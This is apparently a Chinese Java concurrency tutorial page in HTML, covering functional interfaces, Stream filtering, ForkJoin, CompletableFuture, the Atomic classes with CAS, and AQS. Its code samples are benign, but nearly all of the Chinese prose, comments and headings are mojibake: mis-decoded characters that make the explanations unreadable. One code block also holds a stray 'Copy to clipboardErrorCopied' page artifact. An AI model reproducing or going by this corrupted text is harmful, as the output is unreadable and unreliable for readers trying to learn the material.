<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> function;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.function.Consumer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Consumer æ¶ˆè´¹å‹æ¥å£ï¼š åªæœ‰è¾“å…¥ï¼Œæ²¡æœ‰è¿”å›å€¼</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-26 9:32 ä¸‹åˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        Consumer&lt;String&gt; consumer = new Consumer&lt;String&gt;() &#123;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public void accept(String s) &#123;</span></span><br><span class="line"><span class="comment">//                System.out.println(s);</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;;</span></span><br><span class="line"><span class="comment">//        consumer.accept(&quot;sss&quot;);</span></span><br><span class="line"></span><br><span class="line">        Consumer&lt;String&gt; consumer = System.out::println;</span><br><span class="line">        consumer.accept(<span class="string">&quot;ss&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> function;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.function.Supplier;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * supplier ä¾›ç»™å‹æ¥å£ï¼Œ æ²¡æœ‰å‚æ•°åªæœ‰è¿”å›å€¼</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-26 9:33 ä¸‹åˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        Supplier&lt;Integer&gt; supplier = new Supplier&lt;Integer&gt;() &#123;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public Integer get() &#123;</span></span><br><span class="line"><span class="comment">//                return 1024;</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;;</span></span><br><span class="line"><span class="comment">//        System.out.println(supplier.get());</span></span><br><span class="line"></span><br><span class="line">        Supplier&lt;Integer&gt; supplier = ()-&gt;<span class="number">1024</span>;</span><br><span class="line">        System.out.println(supplier.get());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Streamæµå¼è®¡ç®—"><a href="#Streamæµå¼è®¡ç®—" class="headerlink" title="Streamæµå¼è®¡ç®—"></a>Streamæµå¼è®¡ç®—</h2><p>é›†åˆã€MySQLæœ¬è´¨å°±æ˜¯å­˜å‚¨ä¸œè¥¿çš„; è®¡ç®—éƒ½åº”è¯¥äº¤ç»™æµæ¥æ“ä½œ;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Stream&lt;P_OUT&gt; <span class="title function_">filter</span><span class="params">(Predicate&lt;? <span class="built_in">super</span> P_OUT&gt; predicate)</span> &#123;</span><br><span class="line">        Objects.requireNonNull(predicate);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StatelessOp</span>&lt;P_OUT, P_OUT&gt;(<span class="built_in">this</span>, StreamShape.REFERENCE,</span><br><span class="line">                                     StreamOpFlag.NOT_SIZED) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            Sink&lt;P_OUT&gt; <span class="title function_">opWrapSink</span><span class="params">(<span class="type">int</span> flags, Sink&lt;P_OUT&gt; sink)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Sink</span>.ChainedReference&lt;P_OUT, P_OUT&gt;(sink) &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">begin</span><span class="params">(<span class="type">long</span> size)</span> &#123;</span><br><span class="line">                        downstream.begin(-<span class="number">1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">accept</span><span class="params">(P_OUT u)</span> &#123;</span><br><span class="line">                        <span class="comment">//å…³é”®ä»£ç , ç”±æ–­å®šå‹æ¥å£æ¥æ™’é€‰</span></span><br><span class="line">                        <span class="keyword">if</span> (predicate.test(u))</span><br><span class="line">                            downstream.accept(u);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h2 id="ForkJoin"><a href="#ForkJoin" class="headerlink" title="ForkJoin"></a>ForkJoin</h2><p>Jdk1.7 ,å¹¶å‘æ‰§è¡Œä»»åŠ¡,æé«˜æ•ˆç‡; å¤§æ•°æ®é‡;  å·¥ä½œçªƒå–;  Bçº¿ç¨‹æ‰§è¡Œå®Œä¼šå»æ‹¿Açš„çº¿ç¨‹æ²¡æ‰§è¡Œå®Œçš„ä»»åŠ¡; çº¿ç¨‹é‡Œé¢çš„ä»»åŠ¡æ˜¯åŒç«¯é˜Ÿåˆ—,ä¸¤ç«¯éƒ½å¯ä»¥å–åˆ°ä»»åŠ¡; </p>
<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848164.png" alt="image-20210427072722808" style="zoom:50%;" />

<p>å¤§æ•°æ®: Map Reduce(æŠŠå¤§ä»»åŠ¡æ‹†åˆ†æˆå°ä»»åŠ¡)</p>
<p>fork()ï¼šå¼€å¯ä¸€ä¸ªæ–°çº¿ç¨‹ï¼ˆæˆ–æ˜¯é‡ç”¨çº¿ç¨‹æ± å†…çš„ç©ºé—²çº¿ç¨‹ï¼‰ï¼Œå°†ä»»åŠ¡äº¤ç»™è¯¥çº¿ç¨‹å¤„ç†ã€‚<br>join()ï¼šç­‰å¾…è¯¥ä»»åŠ¡çš„å¤„ç†çº¿ç¨‹å¤„ç†å®Œæ¯•ï¼Œè·å¾—è¿”å›å€¼ã€‚</p>
<h2 id="å¼‚æ­¥å›è°ƒ"><a href="#å¼‚æ­¥å›è°ƒ" class="headerlink" title="å¼‚æ­¥å›è°ƒ"></a>å¼‚æ­¥å›è°ƒ</h2><p>completableFutureå¯ä»¥æœ‰è¿”å›å€¼ä¹Ÿå¯ä»¥æ²¡æœ‰, ä¹Ÿæ˜¯æ–°å»ºçº¿ç¨‹å»å¤„ç†</p>
<h2 id="AtomicåŸå­ç±»"><a href="#AtomicåŸå­ç±»" class="headerlink" title="AtomicåŸå­ç±»"></a>AtomicåŸå­ç±»</h2><p>å…·æœ‰åŸå­&#x2F;åŸå­æ“ä½œç‰¹å¾çš„ç±»;ä½¿ç”¨ AtomicInteger ä¹‹åï¼Œä¸ç”¨å¯¹ increment() æ–¹æ³•åŠ é”ä¹Ÿå¯ä»¥ä¿è¯çº¿ç¨‹å®‰å…¨;åº•å±‚CASå®ç°; åœ¨å†…å­˜ä¸­ä¿®æ”¹å€¼, Unsafeç±»,é‡Œé¢åŸºæœ¬éƒ½æ˜¯è°ƒç”¨nativeæ–¹æ³•;</p>
<p>AtomicInteger ç±»ä¸»è¦åˆ©ç”¨ CAS (compare and swap) + volatile å’Œ native æ–¹æ³•æ¥ä¿è¯åŸå­æ“ä½œï¼Œä»è€Œé¿å… synchronized çš„é«˜å¼€é”€ï¼Œæ‰§è¡Œæ•ˆç‡å¤§ä¸ºæå‡ã€‚</p>
<h3 id="JUC-åŒ…ä¸­çš„åŸå­ç±»æ˜¯å“ª-4-ç±»"><a href="#JUC-åŒ…ä¸­çš„åŸå­ç±»æ˜¯å“ª-4-ç±»" class="headerlink" title="JUC åŒ…ä¸­çš„åŸå­ç±»æ˜¯å“ª 4 ç±»?"></a>JUC åŒ…ä¸­çš„åŸå­ç±»æ˜¯å“ª 4 ç±»?</h3><p><strong>åŸºæœ¬ç±»å‹</strong></p>
<p>ä½¿ç”¨åŸå­çš„æ–¹å¼æ›´æ–°åŸºæœ¬ç±»å‹</p>
<ul>
<li><code>AtomicInteger</code>ï¼šæ•´å½¢åŸå­ç±»</li>
<li><code>AtomicLong</code>ï¼šé•¿æ•´å‹åŸå­ç±»</li>
<li><code>AtomicBoolean</code>ï¼šå¸ƒå°”å‹åŸå­ç±»</li>
</ul>
<p><strong>æ•°ç»„ç±»å‹</strong></p>
<p>ä½¿ç”¨åŸå­çš„æ–¹å¼æ›´æ–°æ•°ç»„é‡Œçš„æŸä¸ªå…ƒç´ </p>
<ul>
<li><code>AtomicIntegerArray</code>ï¼šæ•´å½¢æ•°ç»„åŸå­ç±»</li>
<li><code>AtomicLongArray</code>ï¼šé•¿æ•´å½¢æ•°ç»„åŸå­ç±»</li>
<li><code>AtomicReferenceArray</code>ï¼šå¼•ç”¨ç±»å‹æ•°ç»„åŸå­ç±»</li>
</ul>
<p><strong>å¼•ç”¨ç±»å‹</strong></p>
<ul>
<li><code>AtomicReference</code>ï¼šå¼•ç”¨ç±»å‹åŸå­ç±»</li>
<li><code>AtomicStampedReference</code>ï¼šåŸå­æ›´æ–°å¸¦æœ‰ç‰ˆæœ¬å·çš„å¼•ç”¨ç±»å‹ã€‚è¯¥ç±»å°†æ•´æ•°å€¼ä¸å¼•ç”¨å…³è”èµ·æ¥ï¼Œå¯ç”¨äºè§£å†³åŸå­çš„æ›´æ–°æ•°æ®å’Œæ•°æ®çš„ç‰ˆæœ¬å·ï¼Œå¯ä»¥è§£å†³ä½¿ç”¨ CAS è¿›è¡ŒåŸå­æ›´æ–°æ—¶å¯èƒ½å‡ºç°çš„ ABA é—®é¢˜ã€‚</li>
<li><code>AtomicMarkableReference</code> ï¼šåŸå­æ›´æ–°å¸¦æœ‰æ ‡è®°ä½çš„å¼•ç”¨ç±»å‹</li>
</ul>
<p><strong>å¯¹è±¡çš„å±æ€§ä¿®æ”¹ç±»å‹</strong></p>
<ul>
<li><code>AtomicIntegerFieldUpdater</code>ï¼šåŸå­æ›´æ–°æ•´å½¢å­—æ®µçš„æ›´æ–°å™¨</li>
<li><code>AtomicLongFieldUpdater</code>ï¼šåŸå­æ›´æ–°é•¿æ•´å½¢å­—æ®µçš„æ›´æ–°å™¨</li>
<li><code>AtomicReferenceFieldUpdater</code>ï¼šåŸå­æ›´æ–°å¼•ç”¨ç±»å‹å­—æ®µçš„æ›´æ–°å™¨</li>
</ul>
<h3 id="AtomicIntegerçš„ä½¿ç”¨"><a href="#AtomicIntegerçš„ä½¿ç”¨" class="headerlink" title="AtomicIntegerçš„ä½¿ç”¨"></a>AtomicIntegerçš„ä½¿ç”¨</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">()</span> <span class="comment">//è·å–å½“å‰çš„å€¼</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getAndSet</span><span class="params">(<span class="type">int</span> newValue)</span><span class="comment">//è·å–å½“å‰çš„å€¼ï¼Œå¹¶è®¾ç½®æ–°çš„å€¼</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getAndIncrement</span><span class="params">()</span><span class="comment">//è·å–å½“å‰çš„å€¼ï¼Œå¹¶è‡ªå¢</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getAndDecrement</span><span class="params">()</span> <span class="comment">//è·å–å½“å‰çš„å€¼ï¼Œå¹¶è‡ªå‡</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getAndAdd</span><span class="params">(<span class="type">int</span> delta)</span> <span class="comment">//è·å–å½“å‰çš„å€¼ï¼Œå¹¶åŠ ä¸Šé¢„æœŸçš„å€¼</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">compareAndSet</span><span class="params">(<span class="type">int</span> expect, <span class="type">int</span> update)</span> <span class="comment">//å¦‚æœè¾“å…¥çš„æ•°å€¼ç­‰äºé¢„æœŸå€¼ï¼Œåˆ™ä»¥åŸå­æ–¹å¼å°†è¯¥å€¼è®¾ç½®ä¸ºè¾“å…¥å€¼ï¼ˆupdateï¼‰</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">lazySet</span><span class="params">(<span class="type">int</span> newValue)</span><span class="comment">//æœ€ç»ˆè®¾ç½®ä¸ºnewValue,ä½¿ç”¨ lazySet è®¾ç½®ä¹‹åå¯èƒ½å¯¼è‡´å…¶ä»–çº¿ç¨‹åœ¨ä¹‹åçš„ä¸€å°æ®µæ—¶é—´å†…è¿˜æ˜¯å¯ä»¥è¯»åˆ°æ—§çš„å€¼ã€‚</span></span><br></pre></td></tr></table></figure>

<h3 id="AtomicIntegerç±»çš„åŸç†"><a href="#AtomicIntegerç±»çš„åŸç†" class="headerlink" title="AtomicIntegerç±»çš„åŸç†"></a>AtomicIntegerç±»çš„åŸç†</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// setup to use Unsafe.compareAndSwapInt for updatesï¼ˆæ›´æ–°æ“ä½œæ—¶æä¾›â€œæ¯”è¾ƒå¹¶æ›¿æ¢â€çš„ä½œç”¨ï¼‰</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> Unsafe.getUnsafe();</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> valueOffset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        valueOffset = unsafe.objectFieldOffset</span><br><span class="line">            (AtomicInteger.class.getDeclaredField(<span class="string">&quot;value&quot;</span>));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(ex); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">int</span> value;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>AtomicInteger ç±»ä¸»è¦åˆ©ç”¨ CAS (compare and swap) + volatile å’Œ native æ–¹æ³•æ¥ä¿è¯åŸå­æ“ä½œï¼Œä»è€Œé¿å… synchronized çš„é«˜å¼€é”€ï¼Œæ‰§è¡Œæ•ˆç‡å¤§ä¸ºæå‡ã€‚</p>
<p>CAS çš„åŸç†æ˜¯æ‹¿æœŸæœ›çš„å€¼å’ŒåŸæœ¬çš„ä¸€ä¸ªå€¼ä½œæ¯”è¾ƒï¼Œå¦‚æœç›¸åŒåˆ™æ›´æ–°æˆæ–°çš„å€¼ã€‚UnSafe ç±»çš„ objectFieldOffset() æ–¹æ³•æ˜¯ä¸€ä¸ªæœ¬åœ°æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯ç”¨æ¥æ‹¿åˆ°â€œåŸæ¥çš„å€¼â€çš„å†…å­˜åœ°å€ï¼Œè¿”å›å€¼æ˜¯ valueOffsetã€‚å¦å¤– value æ˜¯ä¸€ä¸ª volatile å˜é‡ï¼Œåœ¨å†…å­˜ä¸­å¯è§ï¼Œå› æ­¤ JVM å¯ä»¥ä¿è¯ä»»ä½•æ—¶åˆ»ä»»ä½•çº¿ç¨‹æ€»èƒ½æ‹¿åˆ°è¯¥å˜é‡çš„æœ€æ–°å€¼ã€‚</p>
<h2 id="AQS"><a href="#AQS" class="headerlink" title="AQS"></a>AQS</h2><p>AQS çš„å…¨ç§°ä¸ºï¼ˆAbstractQueuedSynchronizerï¼‰ï¼Œè¿™ä¸ªç±»åœ¨java.util.concurrent.locksåŒ…ä¸‹é¢;</p>
<p>AQS æ˜¯ä¸€ä¸ªç”¨æ¥æ„å»ºé”å’ŒåŒæ­¥å™¨çš„æ¡†æ¶ï¼Œä½¿ç”¨ AQS èƒ½ç®€å•ä¸”é«˜æ•ˆåœ°æ„é€ å‡ºåº”ç”¨å¹¿æ³›çš„å¤§é‡çš„åŒæ­¥å™¨ï¼Œæ¯”å¦‚æˆ‘ä»¬æåˆ°çš„ ReentrantLockï¼ŒSemaphoreï¼Œå…¶ä»–çš„è¯¸å¦‚ ReentrantReadWriteLockï¼ŒSynchronousQueueï¼ŒFutureTask ç­‰ç­‰çš†æ˜¯åŸºäº AQS çš„ã€‚å½“ç„¶ï¼Œæˆ‘ä»¬è‡ªå·±ä¹Ÿèƒ½åˆ©ç”¨ AQS éå¸¸è½»æ¾å®¹æ˜“åœ°æ„é€ å‡ºç¬¦åˆæˆ‘ä»¬è‡ªå·±éœ€æ±‚çš„åŒæ­¥å™¨ã€‚</p>
<h3 id="AQSåŸç†åˆ†æ"><a href="#AQSåŸç†åˆ†æ" class="headerlink" title="AQSåŸç†åˆ†æ"></a>AQSåŸç†åˆ†æ</h3><p>AQS æ ¸å¿ƒæ€æƒ³æ˜¯ï¼Œå¦‚æœè¢«è¯·æ±‚çš„å…±äº«èµ„æºç©ºé—²ï¼Œåˆ™å°†å½“å‰è¯·æ±‚èµ„æºçš„çº¿ç¨‹è®¾ç½®ä¸ºæœ‰æ•ˆçš„å·¥ä½œçº¿ç¨‹ï¼Œå¹¶ä¸”å°†å…±äº«èµ„æºè®¾ç½®ä¸ºé”å®šçŠ¶æ€ã€‚å¦‚æœè¢«è¯·æ±‚çš„å…±äº«èµ„æºè¢«å ç”¨ï¼Œé‚£ä¹ˆå°±éœ€è¦ä¸€å¥—çº¿ç¨‹é˜»å¡ç­‰å¾…ä»¥åŠè¢«å”¤é†’æ—¶é”åˆ†é…çš„æœºåˆ¶ï¼Œè¿™ä¸ªæœºåˆ¶ AQS æ˜¯ç”¨ CLH é˜Ÿåˆ—é”å®ç°çš„ï¼Œå³å°†æš‚æ—¶è·å–ä¸åˆ°é”çš„çº¿ç¨‹åŠ å…¥åˆ°é˜Ÿåˆ—ä¸­ã€‚</p>
<p>CLH(Craig,Landin,and Hagersten)é˜Ÿåˆ—æ˜¯ä¸€ä¸ªè™šæ‹Ÿçš„åŒå‘é˜Ÿåˆ—ï¼ˆè™šæ‹Ÿçš„åŒå‘é˜Ÿåˆ—å³ä¸å­˜åœ¨é˜Ÿåˆ—å®ä¾‹ï¼Œä»…å­˜åœ¨ç»“ç‚¹ä¹‹é—´çš„å…³è”å…³ç³»ï¼‰ã€‚AQS æ˜¯å°†æ¯æ¡è¯·æ±‚å…±äº«èµ„æºçš„çº¿ç¨‹å°è£…æˆä¸€ä¸ª CLH é”é˜Ÿåˆ—çš„ä¸€ä¸ªç»“ç‚¹ï¼ˆNodeï¼‰æ¥å®ç°é”çš„åˆ†é…ã€‚</p>
<p>AQS ä½¿ç”¨ä¸€ä¸ª int æˆå‘˜å˜é‡æ¥è¡¨ç¤ºåŒæ­¥çŠ¶æ€ï¼Œé€šè¿‡å†…ç½®çš„ FIFO é˜Ÿåˆ—æ¥å®Œæˆè·å–èµ„æºçº¿ç¨‹çš„æ’é˜Ÿå·¥ä½œã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848262.png" alt="AQSåŸç†å›¾"></p>
<h3 id="AQSå¯¹èµ„æºçš„å…±äº«æ–¹å¼"><a href="#AQSå¯¹èµ„æºçš„å…±äº«æ–¹å¼" class="headerlink" title="AQSå¯¹èµ„æºçš„å…±äº«æ–¹å¼"></a>AQSå¯¹èµ„æºçš„å…±äº«æ–¹å¼</h3><p><strong>AQS å®šä¹‰ä¸¤ç§èµ„æºå…±äº«æ–¹å¼</strong></p>
<ul>
<li>Exclusiveï¼ˆç‹¬å ï¼‰ï¼šåªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½æ‰§è¡Œï¼Œå¦‚ReentrantLock<ul>
<li>å…¬å¹³é”ï¼šæŒ‰ç…§çº¿ç¨‹åœ¨é˜Ÿåˆ—ä¸­çš„æ’é˜Ÿé¡ºåºï¼Œå…ˆåˆ°è€…å…ˆæ‹¿åˆ°é”</li>
<li>éå…¬å¹³é”ï¼šå½“çº¿ç¨‹è¦è·å–é”æ—¶ï¼Œæ— è§†é˜Ÿåˆ—é¡ºåºç›´æ¥å»æŠ¢é”ï¼Œè°æŠ¢åˆ°å°±æ˜¯è°çš„</li>
</ul>
</li>
<li>Shareï¼ˆå…±äº«ï¼‰ï¼šå¤šä¸ªçº¿ç¨‹å¯åŒæ—¶æ‰§è¡Œï¼Œå¦‚CountDownLatchã€Semaphoreã€ CyclicBarrierã€ReadWriteLock æˆ‘ä»¬éƒ½ä¼šåœ¨åé¢è®²åˆ°ã€‚</li>
</ul>
<p>ReentrantReadWriteLock å¯ä»¥çœ‹æˆæ˜¯ç»„åˆå¼ï¼Œå› ä¸º ReentrantReadWriteLock ä¹Ÿå°±æ˜¯è¯»å†™é”å…è®¸å¤šä¸ªçº¿ç¨‹åŒæ—¶å¯¹æŸä¸€èµ„æºè¿›è¡Œè¯»ã€‚</p>
<p>ä¸åŒçš„è‡ªå®šä¹‰åŒæ­¥å™¨äº‰ç”¨å…±äº«èµ„æºçš„æ–¹å¼ä¹Ÿä¸åŒã€‚è‡ªå®šä¹‰åŒæ­¥å™¨åœ¨å®ç°æ—¶åªéœ€è¦å®ç°å…±äº«èµ„æº state çš„è·å–ä¸é‡Šæ”¾æ–¹å¼å³å¯ï¼Œè‡³äºå…·ä½“çº¿ç¨‹ç­‰å¾…é˜Ÿåˆ—çš„ç»´æŠ¤ï¼ˆå¦‚è·å–èµ„æºå¤±è´¥å…¥é˜Ÿ&#x2F;å”¤é†’å‡ºé˜Ÿç­‰ï¼‰ï¼ŒAQS å·²ç»åœ¨é¡¶å±‚å®ç°å¥½äº†ã€‚</p>
<h4 id="AQSåº•å±‚ä½¿ç”¨æ¨¡ç‰ˆæ–¹æ³•æ¨¡å¼"><a href="#AQSåº•å±‚ä½¿ç”¨æ¨¡ç‰ˆæ–¹æ³•æ¨¡å¼" class="headerlink" title="AQSåº•å±‚ä½¿ç”¨æ¨¡ç‰ˆæ–¹æ³•æ¨¡å¼"></a>AQSåº•å±‚ä½¿ç”¨æ¨¡ç‰ˆæ–¹æ³•æ¨¡å¼</h4><p>åŒæ­¥å™¨çš„è®¾è®¡æ˜¯åŸºäºæ¨¡æ¿æ–¹æ³•æ¨¡å¼çš„ï¼Œå¦‚æœéœ€è¦è‡ªå®šä¹‰åŒæ­¥å™¨ä¸€èˆ¬çš„æ–¹å¼æ˜¯è¿™æ ·ï¼ˆæ¨¡æ¿æ–¹æ³•æ¨¡å¼å¾ˆç»å…¸çš„ä¸€ä¸ªåº”ç”¨ï¼‰ï¼š</p>
<ol>
<li>ä½¿ç”¨è€…ç»§æ‰¿ AbstractQueuedSynchronizer å¹¶é‡å†™æŒ‡å®šçš„æ–¹æ³•ã€‚ï¼ˆè¿™äº›é‡å†™æ–¹æ³•å¾ˆç®€å•ï¼Œæ— éæ˜¯å¯¹äºå…±äº«èµ„æº state çš„è·å–å’Œé‡Šæ”¾ï¼‰</li>
<li>å°† AQS ç»„åˆåœ¨è‡ªå®šä¹‰åŒæ­¥ç»„ä»¶çš„å®ç°ä¸­ï¼Œå¹¶è°ƒç”¨å…¶æ¨¡æ¿æ–¹æ³•ï¼Œè€Œè¿™äº›æ¨¡æ¿æ–¹æ³•ä¼šè°ƒç”¨ä½¿ç”¨è€…é‡å†™çš„æ–¹æ³•ã€‚</li>
</ol>
<p>è¿™å’Œæˆ‘ä»¬ä»¥å¾€é€šè¿‡å®ç°æ¥å£çš„æ–¹å¼æœ‰å¾ˆå¤§åŒºåˆ«ï¼Œè¿™æ˜¯æ¨¡æ¿æ–¹æ³•æ¨¡å¼å¾ˆç»å…¸çš„ä¸€ä¸ªè¿ç”¨ã€‚</p>
<p>AQS ä½¿ç”¨äº†æ¨¡æ¿æ–¹æ³•æ¨¡å¼ï¼Œè‡ªå®šä¹‰åŒæ­¥å™¨æ—¶éœ€è¦é‡å†™ä¸‹é¢å‡ ä¸ª AQS æä¾›çš„æ¨¡æ¿æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">isHeldExclusively()<span class="comment">//è¯¥çº¿ç¨‹æ˜¯å¦æ­£åœ¨ç‹¬å èµ„æºã€‚åªæœ‰ç”¨åˆ°conditionæ‰éœ€è¦å»å®ç°å®ƒã€‚</span></span><br><span class="line">tryAcquire(<span class="type">int</span>)<span class="comment">//ç‹¬å æ–¹å¼ã€‚å°è¯•è·å–èµ„æºï¼ŒæˆåŠŸåˆ™è¿”å›trueï¼Œå¤±è´¥åˆ™è¿”å›falseã€‚</span></span><br><span class="line">tryRelease(<span class="type">int</span>)<span class="comment">//ç‹¬å æ–¹å¼ã€‚å°è¯•é‡Šæ”¾èµ„æºï¼ŒæˆåŠŸåˆ™è¿”å›trueï¼Œå¤±è´¥åˆ™è¿”å›falseã€‚</span></span><br><span class="line">tryAcquireShared(<span class="type">int</span>)<span class="comment">//å…±äº«æ–¹å¼ã€‚å°è¯•è·å–èµ„æºã€‚è´Ÿæ•°è¡¨ç¤ºå¤±è´¥ï¼›0è¡¨ç¤ºæˆåŠŸï¼Œä½†æ²¡æœ‰å‰©ä½™å¯ç”¨èµ„æºï¼›æ­£æ•°è¡¨ç¤ºæˆåŠŸï¼Œä¸”æœ‰å‰©ä½™èµ„æºã€‚</span></span><br><span class="line">tryReleaseShared(<span class="type">int</span>)<span class="comment">//å…±äº«æ–¹å¼ã€‚å°è¯•é‡Šæ”¾èµ„æºï¼ŒæˆåŠŸåˆ™è¿”å›trueï¼Œå¤±è´¥åˆ™è¿”å›falseã€‚</span></span><br><span class="line">Copy to clipboardErrorCopied</span><br></pre></td></tr></table></figure>

<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯ä¸ªæ–¹æ³•éƒ½æŠ›å‡º UnsupportedOperationExceptionã€‚ è¿™äº›æ–¹æ³•çš„å®ç°å¿…é¡»æ˜¯å†…éƒ¨çº¿ç¨‹å®‰å…¨çš„ï¼Œå¹¶ä¸”é€šå¸¸åº”è¯¥ç®€çŸ­è€Œä¸æ˜¯é˜»å¡ã€‚AQS ç±»ä¸­çš„å…¶ä»–æ–¹æ³•éƒ½æ˜¯ final ï¼Œæ‰€ä»¥æ— æ³•è¢«å…¶ä»–ç±»ä½¿ç”¨ï¼Œåªæœ‰è¿™å‡ ä¸ªæ–¹æ³•å¯ä»¥è¢«å…¶ä»–ç±»ä½¿ç”¨ã€‚</p>
<p>ä»¥ ReentrantLock ä¸ºä¾‹ï¼Œstate åˆå§‹åŒ–ä¸º 0ï¼Œè¡¨ç¤ºæœªé”å®šçŠ¶æ€ã€‚A çº¿ç¨‹ lock()æ—¶ï¼Œä¼šè°ƒç”¨ tryAcquire()ç‹¬å è¯¥é”å¹¶å°† state+1ã€‚æ­¤åï¼Œå…¶ä»–çº¿ç¨‹å† tryAcquire()æ—¶å°±ä¼šå¤±è´¥ï¼Œç›´åˆ° A çº¿ç¨‹ unlock()åˆ° state&#x3D;0ï¼ˆå³é‡Šæ”¾é”ï¼‰ä¸ºæ­¢ï¼Œå…¶å®ƒçº¿ç¨‹æ‰æœ‰æœºä¼šè·å–è¯¥é”ã€‚å½“ç„¶ï¼Œé‡Šæ”¾é”ä¹‹å‰ï¼ŒA çº¿ç¨‹è‡ªå·±æ˜¯å¯ä»¥é‡å¤è·å–æ­¤é”çš„ï¼ˆstate ä¼šç´¯åŠ ï¼‰ï¼Œè¿™å°±æ˜¯å¯é‡å…¥çš„æ¦‚å¿µã€‚ä½†è¦æ³¨æ„ï¼Œè·å–å¤šå°‘æ¬¡å°±è¦é‡Šæ”¾å¤šä¹ˆæ¬¡ï¼Œè¿™æ ·æ‰èƒ½ä¿è¯ state æ˜¯èƒ½å›åˆ°é›¶æ€çš„ã€‚</p>
